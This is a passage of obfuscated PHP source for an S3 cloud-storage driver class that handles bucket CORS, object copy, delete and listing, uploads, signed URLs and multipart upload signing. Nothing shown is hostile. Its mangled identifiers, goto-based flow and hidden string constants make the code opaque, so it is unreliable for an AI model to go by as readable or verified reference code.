md5("{$FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[28]]}\137{$FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[76]]}\137{$FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[78]]}"); } } $C‚˜§Š› = "{$Fİƒ¦Ä}\x5f{$b©ƒ¥ˆ“¦¶}\x2e\160\156\147"; goto c×ŒªŒ¡õ; DÙÈ©›Õ¯: } public function fileOutImageServer($CÀĞœÑ®“‹, $cŠÜÜ´˜šî = 250) { $this->fileOutImage($CÀĞœÑ®“‹, $cŠÜÜ´˜šî); } public function fileNameAuto($F×Ê¼Ìù‘È, $D®‘¤¤¨â, $AËå†òÏÈ = REPEAT_RENAME, $F·¨Ô‰Ê„ = false) { goto cª˜¾Ü÷Óè; eˆù¢­··¾: while ($this->exist(rtrim($F×Ê¼Ìù‘È, $EøÂˆŒ­Î˜[8]) . $EøÂˆŒ­Î˜[8] . $c¤–ØÌ×Ê¶)) { $c¤–ØÌ×Ê¶ = $f‘ñœ²¬¸À . "\50{$BÏ·Ã‰Ê¬´}\51{$B²“§®áŞ}"; $BÏ·Ã‰Ê¬´++; } return $c¤–ØÌ×Ê¶; goto aøÒµº¿Ëİ; fÙ¡³¥‡: $BÏ·Ã‰Ê¬´ = 1; $f‘ñœ²¬¸À = substr($D®‘¤¤¨â, 0, strlen($D®‘¤¤¨â) - strlen($B²“§®áŞ)); $c¤–ØÌ×Ê¶ = $f‘ñœ²¬¸À . "\x28{$BÏ·Ã‰Ê¬´}\51{$B²“§®áŞ}"; goto eˆù¢­··¾; b‰ùøùä«å: if ($AËå†òÏÈ == REPEAT_SKIP) { return !1; } $B²“§®áŞ = $EøÂˆŒ­Î˜[94] . get_path_ext($D®‘¤¤¨â); $B²“§®áŞ = $B²“§®áŞ == $EøÂˆŒ­Î˜[94] || $F·¨Ô‰Ê„ ? $EøÂˆŒ­Î˜[33] : $B²“§®áŞ; goto fÙ¡³¥‡; cª˜¾Ü÷Óè: $EøÂˆŒ­Î˜ =& $_SERVER[ì‹É]; $aŒ¹éšåˆ« = $F×Ê¼Ìù‘È === $EøÂˆŒ­Î˜[33] ? $D®‘¤¤¨â : rtrim($F×Ê¼Ìù‘È, $EøÂˆŒ­Î˜[8]) . $EøÂˆŒ­Î˜[8] . $D®‘¤¤¨â; if ($AËå†òÏÈ == REPEAT_REPLACE || !$this->exist($aŒ¹éšåˆ«) || $F·¨Ô‰Ê„ && $AËå†òÏÈ != REPEAT_RENAME_FOLDER) { return $D®‘¤¤¨â; } goto b‰ùøùä«å; aøÒµº¿Ëİ: } public function listAllFiles($eä¬è‚…÷ˆ, $bË’”ÑÈ´å, $Eª‰†õÜØµ = array()) { goto BØ°›ºÄ‰¨; dâ²–å‰¬: foreach (array_unique($D¸êŠÈä) as $CˆÓÛÈŒò¹) { $d–ôà£æ¦« = array($Aøº³šõ²«[76] => $this->getPathOuter($Aøº³šõ²«[8] . $eä¬è‚…÷ˆ . $Aøº³šõ²«[8] . $CˆÓÛÈŒò¹), $Aøº³šõ²«[77] => 1, $Aøº³šõ²«[78] => 0); if (substr($CˆÓÛÈŒò¹, -1) != $Aøº³šõ²«[8]) { $d–ôà£æ¦«[$Aøº³šõ²«[77]] = 0; $b×ñ¯£Îœò = $this->getPath($eä¬è‚…÷ˆ . $Aøº³šõ²«[8] . $CˆÓÛÈŒò¹); $d–ôà£æ¦«[$Aøº³šõ²«[78]] = isset($Eª‰†õÜØµ[$b×ñ¯£Îœò]) ? $Eª‰†õÜØµ[$b×ñ¯£Îœò] : $this->size($b×ñ¯£Îœò); } $e©ÍÓâ¿°»[] = $d–ôà£æ¦«; } return $e©ÍÓâ¿°»; goto fÔ¸àô³ƒ; BØ°›ºÄ‰¨: $Aøº³šõ²« =& $_SERVER[ì‹É]; if (empty($bË’”ÑÈ´å)) { return array(); } $D¸êŠÈä = array(); goto DÛğø¼‘²; DÛğø¼‘²: $eä¬è‚…÷ˆ = trim($eä¬è‚…÷ˆ, $Aøº³šõ²«[8]); foreach ($bË’”ÑÈ´å as $CˆÓÛÈŒò¹) { $a‚ÙŠ§çª = ltrim(substr($CˆÓÛÈŒò¹, strlen($eä¬è‚…÷ˆ)), $Aøº³šõ²«[8]); $D¸êŠÈä = array_merge($D¸êŠÈä, $this->slicePath($a‚ÙŠ§çª)); } $e©ÍÓâ¿°» = array(); goto dâ²–å‰¬; fÔ¸àô³ƒ: } public function slicePath($CæßÚ‘ï›) { $F¯Ã÷Âß =& $_SERVER[ì‹É]; $DêÖ¿´™‹’ = explode($F¯Ã÷Âß[8], trim($CæßÚ‘ï›, $F¯Ã÷Âß[8])); $CÔï…¥‹Ğ¢ = 0; do { ++$CÔï…¥‹Ğ¢; $E°«øĞ‰‰Â[] = implode($F¯Ã÷Âß[8], array_slice($DêÖ¿´™‹’, 0, $CÔï…¥‹Ğ¢)) . $F¯Ã÷Âß[8]; } while ($CÔï…¥‹Ğ¢ < count($DêÖ¿´™‹’)); $E°«øĞ‰‰Â[count($DêÖ¿´™‹’) - 1] = $CæßÚ‘ï›; return $E°«øĞ‰‰Â; } public function getHost() { $e¡‡®ù‰¬— =& $_SERVER[ì‹É]; $Fì­Ö¥Óƒ = parse_url(trim($this->domain, $e¡‡®ù‰¬—[8])); $bÉİÊ®èè° = isset($Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[165]]) ? $Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[165]] : http_type(); $dÜØÄ®œ‡ä = isset($Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[166]]) ? $Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[166]] : $Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[76]]; if (isset($Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[167]])) { $dÜØÄ®œ‡ä .= $e¡‡®ù‰¬—[4] . $Fì­Ö¥Óƒ[$e¡‡®ù‰¬—[167]]; } return $bÉİÊ®èè° . $e¡‡®ù‰¬—[168] . $dÜØÄ®œ‡ä; } public function pathEncode($E“¦ÔÈÇ®) { $AïÊéøÀ’ =& $_SERVER[ì‹É]; return str_replace($AïÊéøÀ’[169], $AïÊéøÀ’[8], rawurlencode($E“¦ÔÈÇ®)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Bª¼¥ŸÖò) { set_timeout(); require_once SDK_DIR . $_SERVER[ì‹É][170]; parent::__construct(); $this->_init($Bª¼¥ŸÖò); } public function _init($c°ªµ—È) { foreach ($c°ªµ—È as $b¨†ôËÕ­” => $AñŠæ½Ã‡‹) { if (isset($this->{$b¨†ôËÕ­”})) { $this->{$b¨†ôËÕ­”} = $AñŠæ½Ã‡‹; } } $this->endpoint = $c°ªµ—È[$_SERVER[ì‹É][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($D”ã•­Ã—¢ = "\166\x34") { $this->signVer = $D”ã•­Ã—¢; $this->client->setSignatureVersion($D”ã•­Ã—¢); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto cšßĞ¨ãéÈ; A³¸êËß: $d–«Ö½ïÕ‹ = array($B—÷øÄé[177], $B—÷øÄé[178], $B—÷øÄé[179], $B—÷øÄé[180], $B—÷øÄé[181]); $BçÉ¯àÅœ® = array_diff($d–«Ö½ïÕ‹, $E¬öÙ‰•Ô•); return empty($BçÉ¯àÅœ®); goto bÒ•…åõ¥˜; cšßĞ¨ãéÈ: $B—÷øÄé =& $_SERVER[ì‹É]; $C´Î—ì ³ = $this->getBucketCors(); if (!$C´Î—ì ³ || !is_array($C´Î—ì ³)) { return !1; } goto Bä½øâç‡; Bä½øâç‡: if ($C´Î—ì ³[$B—÷øÄé[172]] != $B—÷øÄé[173] || $C´Î—ì ³[$B—÷øÄé[174]] != $B—÷øÄé[173]) { return !1; } $E¬öÙ‰•Ô• = array_map($B—÷øÄé[175], $C´Î—ì ³[$B—÷øÄé[176]]); if (!is_array($E¬öÙ‰•Ô•)) { $E¬öÙ‰•Ô• = array(); } goto A³¸êËß; bÒ•…åõ¥˜: } public function mkfile($b®ƒ—Ïæ«§, $F’çÌ¼÷¤ = '', $f—ê‡¼”æ = REPEAT_RENAME) { $b­×ÅïïÒ = $this->setContent($b®ƒ—Ïæ«§, $F’çÌ¼÷¤); if ($b­×ÅïïÒ !== !1) { return $this->getPathOuter($b®ƒ—Ïæ«§); } return !1; } public function mkdir($dñŠåÄïº, $B©»‡­„Œ = REPEAT_SKIP) { if (empty($dñŠåÄïº)) { return !1; } if ($this->_isFolder($dñŠåÄïº)) { return $this->getPathOuter($dñŠåÄïº); } $fŞ•’Ò÷³« = $this->setContent($dñŠåÄïº, $_SERVER[ì‹É][33], !0); if ($fŞ•’Ò÷³« !== !1) { return $this->getPathOuter($dñŠåÄïº); } return !1; } public function copyFile($BùİÆ…›à, $e¥ÆßÆ, $Bîèé–Âî‰ = array()) { $F‰ß’••Ï¿ =& $_SERVER[ì‹É]; $A›”½ìá­œ = $this->objectMeta($BùİÆ…›à); if (!$A›”½ìá­œ) { return !1; } if ($A›”½ìá­œ[$F‰ß’••Ï¿[78]] <= 1024 * 1024 * 200) { $bŸã¹ó¿Ë = $this->client->copyObject($this->bucket, $BùİÆ…›à, $this->bucket, $e¥ÆßÆ, $F‰ß’••Ï¿[182], $Bîèé–Âî‰); } else { $bŸã¹ó¿Ë = $this->client->multiCopyObject($this->bucket, $BùİÆ…›à, $this->bucket, $e¥ÆßÆ, $Bîèé–Âî‰); } $bŸã¹ó¿Ë = $bŸã¹ó¿Ë ? $this->getPathOuter($e¥ÆßÆ) : !1; return $bŸã¹ó¿Ë; } public function moveFile($D™™¬Ô˜Ë…, $D¤Ïç³ìà) { if ($this->copyFile($D™™¬Ô˜Ë…, $D¤Ïç³ìà)) { $this->delFile($D™™¬Ô˜Ë…); return $this->getPathOuter($D¤Ïç³ìà); } return !1; } public function delFile($E£²ñƒ›) { return $this->client->deleteObject($this->bucket, $E£²ñƒ›); } public function delFolder($eï‡‰¸Š¨†) { goto bì±œ¦ÊŠ; f›§­©‹×: return $E“çï×í === $bµİ ƒÔ£ ? !0 : !1; goto Då›»ƒ÷âĞ; cˆİî®’ã: $E“çï×í = $bµİ ƒÔ£ = 0; $EçáŠá‡ää = array_chunk(array_keys($DÖ§ªôœ—®), 1000); foreach ($EçáŠá‡ää as $cœ¸É¤Îšù) { $E“çï×í++; $bµİ ƒÔ£ += (int) $this->client->deleteObjects($this->bucket, $cœ¸É¤Îšù); } goto f›§­©‹×; bì±œ¦ÊŠ: $EĞÑÊÜæ÷ =& $_SERVER[ì‹É]; $DÖ§ªôœ—® = $this->listObjs($eï‡‰¸Š¨†); if (!$DÖ§ªôœ—®) { $eï‡‰¸Š¨† = trim($eï‡‰¸Š¨†, $EĞÑÊÜæ÷[8]); if (!empty($eï‡‰¸Š¨†)) { $eï‡‰¸Š¨† .= $EĞÑÊÜæ÷[8]; } return $this->delFile($eï‡‰¸Š¨†); } goto cˆİî®’ã; Då›»ƒ÷âĞ: } public function rename($c¿¢Ô‹Š‰™, $EÀÏø¨Şáˆ) { return $this->renameObject($c¿¢Ô‹Š‰™, $EÀÏø¨Şáˆ); } public function listPath($dÓ‚²÷ãğ©, $dÖ²÷‚´µ‚ = false) { $b™‘ë‘Äø¿ =& $_SERVER[ì‹É]; $a¤°¾ëŸÛ = $this->listObjs($dÓ‚²÷ãğ©, null, null, $b™‘ë‘Äø¿[8]); $cå‡é·Ä‹ = array($b™‘ë‘Äø¿[75] => array(), $b™‘ë‘Äø¿[74] => array()); foreach ($a¤°¾ëŸÛ as $Eé…ŒÒÉËê => $BÚîò‹Íî«) { if ($Eé…ŒÒÉËê == $b™‘ë‘Äø¿[8]) { continue; } if (isset($BÚîò‹Íî«[$b™‘ë‘Äø¿[183]])) { $cå‡é·Ä‹[$b™‘ë‘Äø¿[75]][] = $this->folderInfo($BÚîò‹Íî«[$b™‘ë‘Äø¿[183]], $dÖ²÷‚´µ‚); } else { if (substr($BÚîò‹Íî«[$b™‘ë‘Äø¿[28]], -1) == $b™‘ë‘Äø¿[8]) { continue; } $cå‡é·Ä‹[$b™‘ë‘Äø¿[74]][] = $this->fileInfo($BÚîò‹Íî«[$b™‘ë‘Äø¿[28]], $dÖ²÷‚´µ‚, $BÚîò‹Íî«); } } return $cå‡é·Ä‹; } private function fileInfo($C§£‘«óÕÆ, $bŠğ£Ÿµ¬Î = false, $eàÆ´ŠŸ”È = array()) { goto b¶Ó±“È¢; b¶Ó±“È¢: $eçòºÙŞ³ =& $_SERVER[ì‹É]; if ($bŠğ£Ÿµ¬Î) { return array($eçòºÙŞ³[28] => $this->pathThis($C§£‘«óÕÆ), $eçòºÙŞ³[76] => $this->getPathOuter($C§£‘«óÕÆ), $eçòºÙŞ³[29] => $eçòºÙŞ³[164], $eçòºÙŞ³[157] => $this->ext($C§£‘«óÕÆ), $eçòºÙŞ³[78] => isset($eàÆ´ŠŸ”È[$eçòºÙŞ³[78]]) ? $eàÆ´ŠŸ”È[$eçòºÙŞ³[78]] : 0, $eçòºÙŞ³[184] => $eçòºÙŞ³[50], $eçòºÙŞ³[108] => $eçòºÙŞ³[50], $eçòºÙŞ³[185] => !0, $eçòºÙŞ³[186] => !0); } $cœ…î¤·· = array($eçòºÙŞ³[28] => $this->pathThis($C§£‘«óÕÆ), $eçòºÙŞ³[76] => $this->getPathOuter($C§£‘«óÕÆ), $eçòºÙŞ³[29] => $eçòºÙŞ³[164], $eçòºÙŞ³[184] => $eçòºÙŞ³[50], $eçòºÙŞ³[108] => $eçòºÙŞ³[50], $eçòºÙŞ³[78] => 0, $eçòºÙŞ³[157] => $this->ext($C§£‘«óÕÆ), $eçòºÙŞ³[185] => !0, $eçòºÙŞ³[186] => !0); goto CÛÊÇ•¼òà; b™è•»è™´: return $cœ…î¤··; goto f„È†ï„ùó; CÛÊÇ•¼òà: if (empty($eàÆ´ŠŸ”È)) { $eàÆ´ŠŸ”È = $this->objectMeta($C§£‘«óÕÆ); if (!$eàÆ´ŠŸ”È) { return $cœ…î¤··; } } if (isset($eàÆ´ŠŸ”È[$eçòºÙŞ³[187]])) { $cœ…î¤··[$eçòºÙŞ³[108]] = $eàÆ´ŠŸ”È[$eçòºÙŞ³[187]]; } if (isset($eàÆ´ŠŸ”È[$eçòºÙŞ³[78]])) { $cœ…î¤··[$eçòºÙŞ³[78]] = $eàÆ´ŠŸ”È[$eçòºÙŞ³[78]]; } goto b™è•»è™´; f„È†ï„ùó: } private function folderInfo($b¯²æ‹‰ä­, $cøÔ‘¹³Û = false) { goto FÉÏŒƒƒ½„; Eì©Ô£Š•·: if ($b¯²æ‹‰ä­ == $B‰ÕçÁ¬­[33]) { return $aÎöğŞ£†¼; } $b¯²æ‹‰ä­ = trim($b¯²æ‹‰ä­, $B‰ÕçÁ¬­[8]) . $B‰ÕçÁ¬­[8]; $e°äİ¯Ë¨ = $this->objectMeta($b¯²æ‹‰ä­); goto BÍ”ßƒ´ë‰; FÉÏŒƒƒ½„: $B‰ÕçÁ¬­ =& $_SERVER[ì‹É]; if ($cøÔ‘¹³Û) { return array($B‰ÕçÁ¬­[28] => $this->pathThis($b¯²æ‹‰ä­), $B‰ÕçÁ¬­[76] => $this->getPathOuter($B‰ÕçÁ¬­[8] . $b¯²æ‹‰ä­), $B‰ÕçÁ¬­[29] => $B‰ÕçÁ¬­[77], $B‰ÕçÁ¬­[185] => !0, $B‰ÕçÁ¬­[186] => !0); } $aÎöğŞ£†¼ = array($B‰ÕçÁ¬­[28] => $this->pathThis($b¯²æ‹‰ä­), $B‰ÕçÁ¬­[76] => $this->getPathOuter($B‰ÕçÁ¬­[8] . $b¯²æ‹‰ä­), $B‰ÕçÁ¬­[29] => $B‰ÕçÁ¬­[77], $B‰ÕçÁ¬­[184] => $B‰ÕçÁ¬­[50], $B‰ÕçÁ¬­[108] => $B‰ÕçÁ¬­[50], $B‰ÕçÁ¬­[185] => !0, $B‰ÕçÁ¬­[186] => !0); goto Eì©Ô£Š•·; BÍ”ßƒ´ë‰: if (!$e°äİ¯Ë¨) { return $aÎöğŞ£†¼; } if (isset($B½à£ãŠ”Ğ[$B‰ÕçÁ¬­[187]])) { $aÎöğŞ£†¼[$B‰ÕçÁ¬­[184]] = $B½à£ãŠ”Ğ[$B‰ÕçÁ¬­[187]]; } return $aÎöğŞ£†¼; goto EïÎ¾¹ë; EïÎ¾¹ë: } public function listObjs($dä ÃßØàä, $BÅÊØÖÖ¤İ = null, $EöîÛ”ÊÜ = null, $bÔôªöïÉ = null) { $bí–äŠÌ‰– =& $_SERVER[ì‹É]; $dä ÃßØàä = trim($dä ÃßØàä, $bí–äŠÌ‰–[8]); $C¿ôİàÖŒ = empty($dä ÃßØàä) ? $bí–äŠÌ‰–[33] : $dä ÃßØàä . $bí–äŠÌ‰–[8]; return $this->client->getBucket($this->bucket, $C¿ôİàÖŒ, $BÅÊØÖÖ¤İ, $EöîÛ”ÊÜ, $bÔôªöïÉ, !0); } public function has($eŠùË‘ï†¡, $cïŸˆ¤”Š = false, $e‚¤Â‡°Öó = true) { goto EêƒíÓÎ¶º; CñÔâ¯¶: if ($cïŸˆ¤”Š) { return array($a‰›ã ’¥[188] => $e„Ïó‰¤Î, $a‰›ã ’¥[189] => $fÆì¬ğ¸Ÿ°); } return !1; goto C¼Ï ‡ç°; EêƒíÓÎ¶º: $a‰›ã ’¥ =& $_SERVER[ì‹É]; $e„Ïó‰¤Î = 0; $fÆì¬ğ¸Ÿ° = 0; goto EÒ„¶´ß³ˆ; EÒ„¶´ß³ˆ: $D–é¨ŒÔé = $this->listObjs($eŠùË‘ï†¡, null, null, $a‰›ã ’¥[8]); $D–é¨ŒÔé = is_array($D–é¨ŒÔé) ? $D–é¨ŒÔé : array(); foreach ($D–é¨ŒÔé as $fíª›Ê­ø¸) { if (isset($fíª›Ê­ø¸[$a‰›ã ’¥[28]]) && substr($fíª›Ê­ø¸[$a‰›ã ’¥[28]], -1) != $a‰›ã ’¥[8]) { if (!$cïŸˆ¤”Š && $e‚¤Â‡°Öó) { return !0; } $e„Ïó‰¤Î++; } else { if (isset($fíª›Ê­ø¸[$a‰›ã ’¥[183]])) { if (!$cïŸˆ¤”Š && !$e‚¤Â‡°Öó) { return !1; } $fÆì¬ğ¸Ÿ°++; } } } goto CñÔâ¯¶; C¼Ï ‡ç°: } public function listAll($C×ëø™¶é•) { $Fô‚éòçî¥ =& $_SERVER[ì‹É]; $cè¡©ë’† = $this->listObjs($C×ëø™¶é•); $AÜ¸—Ş Å = $dĞ¨“Ş¯´î = array(); foreach ($cè¡©ë’† as $c¢àÊÕÙ¤Ñ => $EÙìÆæÍÙ¨) { $AÜ¸—Ş Å[] = $EÙìÆæÍÙ¨[$Fô‚éòçî¥[28]]; $dĞ¨“Ş¯´î[$c¢àÊÕÙ¤Ñ] = $EÙìÆæÍÙ¨[$Fô‚éòçî¥[78]]; } return $this->listAllFiles($C×ëø™¶é•, $AÜ¸—Ş Å, $dĞ¨“Ş¯´î); } public function canRead($AµæçÂ„Œ) { $DƒÎÒ¨µå© =& $_SERVER[ì‹É]; $dĞˆ³ó Š† = $this->client->getAccessControlPolicy($this->bucket, $AµæçÂ„Œ); if (!$dĞˆ³ó Š†) { return !1; } return in_array($dĞˆ³ó Š†, array($DƒÎÒ¨µå©[190], $DƒÎÒ¨µå©[191], $DƒÎÒ¨µå©[192])) ? !0 : !1; } public function canWrite($AĞµœÀùÌ) { $dªàùáÊÈò =& $_SERVER[ì‹É]; $D©ˆÛÙŠ¢ = $this->client->getAccessControlPolicy($this->bucket, $AĞµœÀùÌ); if (!$D©ˆÛÙŠ¢) { return !1; } return in_array($D©ˆÛÙŠ¢, array($dªàùáÊÈò[190], $dªàùáÊÈò[191])) ? !0 : !1; } public function getContent($DÖ¹ù†‹¦±) { return $this->client->getObject($this->bucket, $DÖ¹ù†‹¦±); } public function setContent($Eåóà¦…, $Cè½‘£Ì = '', $D±Ëï‘ƒ¤ì = false) { goto a¹¥µ£‡ä³; a¹¥µ£‡ä³: $cÉáÖ¨¸é¿ =& $_SERVER[ì‹É]; $Eåóà¦… = $D±Ëï‘ƒ¤ì ? trim($Eåóà¦…, $cÉáÖ¨¸é¿[8]) . $cÉáÖ¨¸é¿[8] : $Eåóà¦…; $c²’Ê°’Ç  = get_file_mime(get_path_ext($Eåóà¦…)); goto E¡ï¤åÏßö; E¡ï¤åÏßö: $FŞ†óğ¼¦Ê = $this->client->putObject($Cè½‘£Ì, $this->bucket, $Eåóà¦…, $cÉáÖ¨¸é¿[182], array(), $c²’Ê°’Ç ); if (!$FŞ†óğ¼¦Ê) { return !1; } if ($D±Ëï‘ƒ¤ì) { return !0; } goto B¹ÎÒ®«; B¹ÎÒ®«: $FŞ†óğ¼¦Ê = $this->copyFile($Eåóà¦…, $Eåóà¦…, array($cÉáÖ¨¸é¿[193] => $FŞ†óğ¼¦Ê[$cÉáÖ¨¸é¿[194]])); return $FŞ†óğ¼¦Ê ? !0 : !1; goto eÏ¬¹Ğí¸›; eÏ¬¹Ğí¸›: } public function fileSubstr($d‡àœ®éà–, $Cé²§À¡Ëƒ, $CÄ’èŠ¯£ª) { $FÈ±ÂœËô = $Cé²§À¡Ëƒ + $CÄ’èŠ¯£ª - 1; return $this->client->getObject($this->bucket, $d‡àœ®éà–, array($_SERVER[ì‹É][195] => "\142\x79\164\145\163\75{$Cé²§À¡Ëƒ}\55{$FÈ±ÂœËô}")); } public function upload($cë’á«ó•, $D…Ôá†¼ª—, $c†Ï°œÀ¦ = false, $aôÅ¥ó…‡± = REPEAT_REPLACE) { $FÑ«ÄöùïÛ =& $_SERVER[ì‹É]; $eØ¿³¼ï×ì = array($FÑ«ÄöùïÛ[193] => @md5_file($D…Ôá†¼ª—)); $f»¦‡£á = array($FÑ«ÄöùïÛ[196] => get_file_mime(get_path_ext($cë’á«ó•))); if (IO::size($D…Ôá†¼ª—) <= 1024 * 1024 * 200) { $EÍª¤ºß«ã = $this->client->putObjectFile($D…Ôá†¼ª—, $this->bucket, $cë’á«ó•, $FÑ«ÄöùïÛ[182], $eØ¿³¼ï×ì, $f»¦‡£á); return !empty($EÍª¤ºß«ã) ? $this->getPathOuter($cë’á«ó•) : !1; } $FÄ£Üò³¾ = $this->client->multiUploadObject($D…Ôá†¼ª—, $this->bucket, trim($cë’á«ó•, $FÑ«ÄöùïÛ[8]), $eØ¿³¼ï×ì, $f»¦‡£á); return $FÄ£Üò³¾ ? $this->getPathOuter($cë’á«ó•) : !1; } public function download($bŒ¸½ïİ´’, $dµÇ±Ñ˜¿î) { if (!@is_dir($this->pathFather($dµÇ±Ñ˜¿î)) && !IO::mkdir($this->pathFather($dµÇ±Ñ˜¿î))) { return !1; } $FÖ£ó±¨í† = $this->client->getObject($this->bucket, $bŒ¸½ïİ´’, array(), $dµÇ±Ñ˜¿î); return $FÖ£ó±¨í† !== !1 ? $dµÇ±Ñ˜¿î : !1; } public function link($C½Û†ßŒ¯“, $b·çÊ…ß = array()) { $BŒ‘†˜£¼Ã =& $_SERVER[ì‹É]; if ($this->signVer == $BŒ‘†˜£¼Ã[197]) { return $this->client->getAuthenticatedURL($this->bucket, $C½Û†ßŒ¯“, 3600 * 12, $b·çÊ…ß); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($C½Û†ßŒ¯“, $BŒ‘†˜£¼Ã[8]), 3600 * 12, $this->region, array(), !0, $b·çÊ…ß); } public function fileOut($F§åî¨Ô“™, $fÍ»ŒÆÙŞó = false, $bÒÙ£À˜¸è = false, $d²Æ¬°…ÇÜ = '') { goto aïÚ”¼ºô; D†®«»—…†: $CÌ‰ˆ¶Ö“ = $this->link($F§åî¨Ô“™, $BêåË¡ï); $this->fileOutLink($CÌ‰ˆ¶Ö“); goto eÈ¶ÖŸñ; cÅ Ãõ¡ó: if ($bíç¬¹îÇ» == $eØğ»½Î‡Á[198]) { return parent::fileOut($F§åî¨Ô“™, $fÍ»ŒÆÙŞó, $bÒÙ£À˜¸è, $d²Æ¬°…ÇÜ); } $fÍ»ŒÆÙŞó = $fÍ»ŒÆÙŞó ? $eØğ»½Î‡Á[199] : $eØğ»½Î‡Á[200]; $BêåË¡ï = array($eØğ»½Î‡Á[201] => $fÍ»ŒÆÙŞó . $eØğ»½Î‡Á[202] . rawurlencode($bÒÙ£À˜¸è), $eØğ»½Î‡Á[203] => $bíç¬¹îÇ»); goto D†®«»—…†; aïÚ”¼ºô: $eØğ»½Î‡Á =& $_SERVER[ì‹É]; if (!$bÒÙ£À˜¸è) { $bÒÙ£À˜¸è = $this->pathThis($F§åî¨Ô“™); } $bíç¬¹îÇ» = get_file_mime(get_path_ext($bÒÙ£À˜¸è)); goto cÅ Ãõ¡ó; eÈ¶ÖŸñ: } public function fileOutServer($f•œñâÇºç, $Bç´¿ç¡½ = false, $AŠ›¹Ê¹¤£ = false, $d¨ƒÚÏ„‚ó = '') { parent::fileOut($f•œñâÇºç, $Bç´¿ç¡½, $AŠ›¹Ê¹¤£, $d¨ƒÚÏ„‚ó); } public function fileOutImage($f¡‡Œ’’–ã, $dšß™¿»â = 250) { $C˜Ä‹…ìŒ = $this->link($f¡‡Œ’’–ã); $this->fileOutLink($C˜Ä‹…ìŒ); } public function fileOutImageServer($E¨¥‚æçÜÈ, $D°Ü‡–˜è¶ = 250) { parent::fileOutImage($E¨¥‚æçÜÈ, $D°Ü‡–˜è¶); } public function hashMd5($b´áõÌ—, $B¡½«ÉˆÍë = '') { $f×Ğêñé®ƒ =& $_SERVER[ì‹É]; $A‡™¿êİå = $this->objectMeta($b´áõÌ—); if (!$A‡™¿êİå) { return !1; } $B¡½«ÉˆÍë = $B¡½«ÉˆÍë ? $B¡½«ÉˆÍë : _get($A‡™¿êİå, $f×Ğêñé®ƒ[204]); $B¡½«ÉˆÍë = $B¡½«ÉˆÍë ? $B¡½«ÉˆÍë : _get($A‡™¿êİå, $f×Ğêñé®ƒ[194], $f×Ğêñé®ƒ[33]); return $B¡½«ÉˆÍë; } public function uploadFormData($Eñà²¹¡µÌ, $a‡Œ–‘ÁØ§ = 3600) { $F·¦Ş½”—è =& $_SERVER[ì‹É]; $A×’ ãÜå¦ = $this->pathFather($Eñà²¹¡µÌ); $BÜ×ôé½¯ì = $this->client->getHttpUploadPostParams($this->bucket, $A×’ ãÜå¦, $F·¦Ş½”—è[182], $a‡Œ–‘ÁØ§); return array_merge((array) $BÜ×ôé½¯ì, array($F·¦Ş½”—è[166] => $this->getHost())); } public function multiUploadFormData($a…¿Çè»‡Î, $e‚Áƒê©É = 3600) { $C«ØÁÜÓö‚ =& $_SERVER[ì‹É]; $fÇê°‡À = gmdate($C«ØÁÜÓö‚[205]); $Fõ›¦È³¸ø = array(); $b¨¹îäÍÎ« = $this->client->getUploadId($this->bucket, $a…¿Çè»‡Î, $Fõ›¦È³¸ø); if (!$b¨¹îäÍÎ«) { return !1; } return array($C«ØÁÜÓö‚[206] => $b¨¹îäÍÎ«, $C«ØÁÜÓö‚[166] => $this->getHost() . $C«ØÁÜÓö‚[8] . $this->pathEncode($a…¿Çè»‡Î), $C«ØÁÜÓö‚[207] => $fÇê°‡À, $C«ØÁÜÓö‚[90] => $a…¿Çè»‡Î); } public function multiUploadAuthData($Dä½éÍêŸ˜, $c‹‰¿¼¥•… = array()) { goto C¦Íœ¸ô©; F¹¯ÊŠÖÄ: $bŒÀ›ïÌŞ´ = implode($bô‚³”œ‚¢[214], $a‚’İ±´); $bƒæÔ‚«Ú™ = base64_encode(hash_hmac($bô‚³”œ‚¢[215], $bŒÀ›ïÌŞ´, $this->secret, !0)); $a¡õƒë¶Ò = $bô‚³”œ‚¢[216] . $this->accessKey . $bô‚³”œ‚¢[4] . $bƒæÔ‚«Ú™; goto b”¢ƒîƒ ª; e¸—Ş’–Ô³: $aÅ±Í´ƒªÍ = $c‹‰¿¼¥•…[$bô‚³”œ‚¢[90]]; unset($c‹‰¿¼¥•…[$bô‚³”œ‚¢[90]]); if (isset($c‹‰¿¼¥•…[$bô‚³”œ‚¢[208]])) { $c‹‰¿¼¥•…[$bô‚³”œ‚¢[207]] = $aê×¤¿„Ù¥; return $this->listUploadParts($aÅ±Í´ƒªÍ, $c‹‰¿¼¥•…); } goto AùÓÍ×á†; b”¢ƒîƒ ª: if (strpos($CÜİöÛ‡Éç, $bô‚³”œ‚¢[210]) === 0) { return array($bô‚³”œ‚¢[217] => $a¡õƒë¶Ò, $bô‚³”œ‚¢[207] => $aê×¤¿„Ù¥); } return $a¡õƒë¶Ò; goto BÌ÷ê…ª¦Š; AùÓÍ×á†: $a‚’İ±´ = array($bô‚³”œ‚¢[209], $bô‚³”œ‚¢[33], $bô‚³”œ‚¢[117], $bô‚³”œ‚¢[33], "\170\55\141\x6d\172\55\x64\x61\x74\x65\x3a{$aê×¤¿„Ù¥}", $bô‚³”œ‚¢[8] . $this->bucket . $bô‚³”œ‚¢[8] . $this->pathEncode($aÅ±Í´ƒªÍ) . $CÜİöÛ‡Éç); if (strpos($CÜİöÛ‡Éç, $bô‚³”œ‚¢[210]) === 0) { $a‚’İ±´[0] = $bô‚³”œ‚¢[211]; } if (isset($c‹‰¿¼¥•…[$bô‚³”œ‚¢[212]]) && 